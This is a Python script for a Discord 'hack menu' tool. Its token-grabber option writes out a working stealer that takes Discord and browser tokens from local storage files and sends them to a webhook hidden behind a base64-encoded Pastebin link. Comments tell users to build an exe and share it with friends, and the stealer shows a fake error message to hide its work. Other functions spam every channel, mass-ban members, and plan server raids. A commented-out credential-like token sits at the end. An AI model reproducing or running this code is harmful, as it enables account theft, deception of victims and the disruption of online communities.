import time
import json
import discord
from colorama import Style , Fore , init
import asyncio
import sys
import logging
import syslog
import random
import os
from tqdm.auto import tqdm
import requests
import base64
import re
from urllib.request import Request, urlopen
import textwrap

intents = discord.Intents.default()
intents.members = True

bot = discord.Client(prefix="!",intents=intents)
os.system("clear")
print(" ")
print("Pinkyhax Linux Tools!")
print("(Run this tool with root/su)")
print("Disclaimer: This tool is Against the Discord TOS i am not reponsible for any bans!")
plattform = sys.platform
modules = sys.modules
thread = sys.thread_info
mod = len(modules)
print(f"Plattform : {plattform}")
print("Loading Python encryption..")


toolbar_width = 100

# setup toolbar
sys.stdout.write("[%s]" % (" " * toolbar_width))
sys.stdout.flush()
sys.stdout.write("\b" * (toolbar_width+1))




a = 1
b = 1

for i in range(toolbar_width):
    time.sleep(0.1)
    while b < 100:
        b = a+1
        time.sleep(0.1)
        a = b+1
        sys.stdout.write("⬛")
        sys.stdout.flush()
        if a > 100:
            sys.stdout.write("]\n")

os.system("clear")
print("Loading PinkyDCHACK.py..")
 


toolbar_width = 100

# setup toolbar
sys.stdout.write("[%s]" % (" " * toolbar_width))
sys.stdout.flush()
sys.stdout.write("\b" * (toolbar_width+1))




a = 1
b = 1

for i in range(toolbar_width):
    time.sleep(0.1)
    while b < 100:
        b = a+1
        time.sleep(0.2)
        a = b+1
        sys.stdout.write("⬛")
        sys.stdout.flush()
        if a > 100:
            sys.stdout.write("]\n")

menu_main_settings = Style.BRIGHT + f'''

---------------------------------------------------------------------
|##################|Pinkyhax Discord Hackmenu|######################|
---------------------------------------------------------------------
                        [1] Password Settings

                        Version : 0.0.2
                        Copyright Pinkyhax 2021
---------------------------------------------------------------------
|########################|Menu Settings|############################|
---------------------------------------------------------------------
'''
menu_bot_settings = Style.BRIGHT + f'''

---------------------------------------------------------------------
|##################|Pinkyhax Discord Hackmenu|######################|
---------------------------------------------------------------------
                        [1] Edit Bot Token
                        [2] Set Bot Preference

                        Version : 0.0.2
                        Copyright Pinkyhax 2021
---------------------------------------------------------------------
|#########################|Bot Settings|############################|
---------------------------------------------------------------------
'''

def menu_settings():
    os.system('clear')
    print(menu_main_settings)
    pw = input("Choose Menu: ")
    if pw == "1":
        os.system("clear")
        password = input("Enter Password: ")
        with open("password.json","w") as password_set:
            json.dump(password, password_set)
        print("Password set!")
        os.system("clear")
        cli()
    if pw == "cli":
        cli()




def MakeFile(file_name, filepath):
        temp_path = filepath + file_name
        with open(file_name, 'w') as f:
            f.write(textwrap.dedent('''\
    #Create a new webhook from discord and copy its url
    #then go to Base64 and encode your webhook, copy the output
    #go to Pastebin and create a new paste and put your encoded webhook in it.
    #copy the raw url of your paste and replace it with pastebin = "your link here"
    #save it, make exe, share with your friends and ur done.

    import requests
    import base64
    import os
    import re
    import json
    import time
    import sys
    from urllib.request import Request, urlopen
    os.system('cls||clear')

    pastebin = "your link here"
    r = requests.get(pastebin)
    content = r.text
    decode = base64.b64decode(content).decode('utf-8')

    WEBHOOK_URL = decode

    PING_ME = True

    def find_tokens(path):
        path += '\\Local Storage\\leveldb'

        tokens = []

        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens

    def main():
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }

        message = '@everyone' if PING_ME else ''

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            message += f'\n**{platform}**\n```\n'

            tokens = find_tokens(path)

            if len(tokens) > 0:
                for token in tokens:
                    message += f'{token}\n'
            else:
                message += 'No tokens found.\n'

            message += '```'

        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }

        payload = json.dumps({'content': message})

        try:
            req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
            urlopen(req)
            print("Something Went Wrong, Try Again Later.")
            time.sleep(4)
            sys.exit()
        except:
            pass

    if __name__ == '__main__':
        main()
                    '''))
        print('Execution completed.')
        cli()

def tokengrab():
    os.system("clear")
    file_name = input("Name your Exploit file: ")
    filepath = input("Type Filepath: ")
    MakeFile(file_name, filepath)

def menu_bot():
    os.system("clear")
    print(menu_bot_settings)
    choice_bot_settings = input("Choose Menu: ")
    if choice_bot_settings == "1":
        os.system("clear")
        try:
            with open("config.json","r") as bot_settings:
                token = json.load(bot_settings)
                print(f"Current token:",token,":   To edit go to config.json!")
                print("Restart Script to Return!")
        except:
            print("No Bot Token found...")
            bot_token = input("Enter new Bot token: ")
            with open("config.json","w") as bot_settings:
                json.dump(bot_token, bot_settings)
            print("Write finished!")
            print("Restart Script to Return")
    if choice_bot_settings == "2":
        os.system("clear")
        asyncio.create_task(status())
    if choice_bot_settings == "cli":
        cli()

async def banall():
    os.system("clear")
    memberlist = []
    for guild in bot.guilds:
        async for member in guild.fetch_members(limit=None):
            memberlist.append(member)
            message = input("Enter Ban Reason:     ")
            while True:
                membe = random.choice(memberlist)
                try:
                    await membe.ban(message)
                    print(f"Sent {membe.name} a DM.")
                except:
                    print(f"Couldnt Ban {membe.name}.")
            print("Sent all the server a DM.")


menu_hack_list = Style.BRIGHT + f'''

---------------------------------------------------------------------
|##################|Pinkyhax Discord Hackmenu|######################|
---------------------------------------------------------------------
        [1] Spam     [Available]            [6] Delete Messages [WIP]
        [2] Ban All  [WIP]                  [7] Admin Exploit [WIP]
        [3] Doomsday  [WIP]                 [8] Stealth Admin [WIP]
        [4] Usertoken Exploit [Available]   [9] Ban Server [WIP]
        [5] Lag Server  [WIP]               [10] Role Spam [WIP]

                        [11] Hack Description

                        Version : 0.0.2
                        Copyright Pinkyhax 2021
                        
                    type : cli then help for help
---------------------------------------------------------------------
|###########################|Hack List|#############################|
---------------------------------------------------------------------
'''
help_menu = Style.BRIGHT + f'''

---------------------------------------------------------------------
|##################|Pinkyhax Discord Hackmenu|######################|
---------------------------------------------------------------------
    main |Returns to main menu|
    hacklist |Shows Hacklist|
    changelog |Shows Changelog|
    exit |Closes Programm|
    help |Shows this Menu|

                        Version : 0.0.2
                        Copyright Pinkyhax 2021
---------------------------------------------------------------------
|############################|Commands|#############################|
---------------------------------------------------------------------
'''
def rcli():
    cli()

def cli():
    cmd = input("> ")
    if cmd == "main":
        os.system("clear")
        print(menu_main)
        choice = input("Open Menu: ")
        if choice == "1":
            menu_bot()
        if choice == "2":
                menu_settings()
        if choice == "3":
            os.system("clear")
            print(menu_hack_list)
            hack_choose()
        if choice == "4":
                print(changelog())
        if choice == "cli":
            rcli()
    if cmd == "help":
        os.system("clear")
        print(help_menu)
        rcli()
    if cmd == "hacklist":
        os.system("clear")
        print(menu_hack_list)
        hack_choose()
    if cmd == "changelog":
        os.system("clear")
        changelog()
    if cmd == "exit":
        os.system("clear")
        print("Thanks for using Pinkyhax Discord Hackmenu!")




def hack_choose():
    print(" ")
    choice = input("Choose your Hack: ")
    print(" ")
    if choice == "11":
        os.system("clear")
        print(menu_hacklist_desc)
        cli()
    if choice == "1":
        asyncio.create_task(spam())
    if choice == "2":
        print("Work in Progress")
    if choice == "4":
        os.system("clear")
        tokengrab()
    if choice > "11" or choice < "1":
        if choice == "cli":
            cli()
        else:
            print("Invalid menu")
            os.system("clear")
            print(menu_hack_list)
            hack_choose()



async def spam():
    os.system("clear")
    print("Fetching all Servers and all Channels...")
    text_channel_list = []
    for guild in bot.guilds:
        for channel in guild.channels:
            if str(channel.type) == 'text':
                text_channel_list.append(channel)
    print("Press CTRL+C to Exit")
    msg = input("Enter Message to spam: ")
    while True:
        chnl = random.choice(text_channel_list)
        await chnl.send(msg)
        print(f"Message send in {chnl} {chnl.id}")

def changelog():
    os.system("clear")
    changes = ("Version 0.0.1 DEV Beta")
    cli()
    return changes

menu_hacklist_desc = Style.BRIGHT + f'''{Fore.WHITE}

---------------------------------------------------------------------
|##################|Pinkyhax Discord Hackmenu|######################|
---------------------------------------------------------------------{Fore.RESET}
{Fore.GREEN}1.[Spam] Spams All Channels and all Servers
2.[Ban all] Ban all user in a Guild
3.[Doomsday] Destroys Guilds
4.[Usertoken Exploit] Uses Exploit to gather User Tokens
5.[Lag Server] Rapitly create Channels and delete them to lag the Server
6.[Delete Messages] Deletes all Messages in a Guild
7.[Admin Exploit] Tries to give you Admin via Role
8.[Stealth Admin] Gives you a invisible role with Admin
{Fore.RESET}{Fore.RED}9.[Ban Server] Spams Graphic Content to ban the server (RISK)
{Fore.RESET}{Fore.GREEN}10. [Role Spam] Spams any User with random Roles
{Fore.RESET}{Fore.WHITE}
                        Version : 0.0.2
                        Copyright Pinkyhax 2021
---------------------------------------------------------------------
|########################|Menu Settings|############################|
---------------------------------------------------------------------
'''

async def status():
    status = input("Type custom Preference: ")
    print("Preference Set!")
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name =f"{status}"))
    print("Preference Set!")


menu_main = Style.BRIGHT + f'''

---------------------------------------------------------------------
|##################|Pinkyhax Discord Hackmenu|######################|
---------------------------------------------------------------------
                        [1] Bot Settings
                        [2] Menu Settings
                        [3] Hack list
                        [4] Changelog
                        [5] Debug

                        type cli to open console

                        Version : 0.0.2
                        Copyright Pinkyhax 2021
---------------------------------------------------------------------
|###################################################################|
---------------------------------------------------------------------
'''
try:
    os.system("clear")
    with open("password.json","r") as code:
        passw = json.load(code)
        check = input("PinkyDCHACK is encrypted! Please enter choosen Password : ")
        toolbar_width = 100
        os.system("clear")
        print("Decrypting...")

        # setup toolbar
        sys.stdout.write("[%s]" % (" " * toolbar_width))
        sys.stdout.flush()
        sys.stdout.write("\b" * (toolbar_width+1))




        a = 1
        b = 1

        for i in range(toolbar_width):
            time.sleep(0.1)
            while b < 100:
                b = a+1
                time.sleep(0.1)
                a = b+1
                sys.stdout.write("⬛")
                sys.stdout.flush()
                if a > 100:
                    sys.stdout.write("]\n")
        print("Decryption Completed!")
        time.sleep(1)
        os.system("clear")
        if check == passw:
            token = input("Enter Bot Token: ")
            @bot.event
            async def on_ready():
                print(f"Bot Online and ready to hack as{bot.user}")
                print(discord.__version__)
                time.sleep(3)
                os.system("clear")
                print(menu_main)
                choice = input("Open Menu: ")
                if choice == "1":
                        menu_bot()
                if choice == "2":
                        menu_settings()
                if choice == "3":
                        os.system("clear")
                        print(menu_hack_list)
                        hack_choose()
                if choice == "4":
                        print(changelog())
                if choice == "cli":
                    cli()
            bot.run(token)
        else:
            print("Wrong Password! Decryption denied!")
except:
    os.system("clear")
    print("No decryption Activated!")
    time.sleep(2)
    os.system("clear")
    token = input("Enter Bot Token: ")
    @bot.event
    async def on_ready():
        print(f"Bot Online and ready to hack as{bot.user}")
        print(discord.__version__)
        print(menu_main)
        choice = input("Open Menu: ")
        if choice == "1":
            menu_bot()
        if choice == "2":
            menu_settings()
        if choice == "3":
            print(menu_hack_list)
            hack_choose()
        if choice == "4":
            print(changelog())
        if choice == "cli":
            cli()
    bot.run(token)

   #     ODQ4NTY4MTM1MjkxNTAyNTkz.YLOgqQ.eQy2ow0hUxKiatga--CqaMtgIFw
        
        
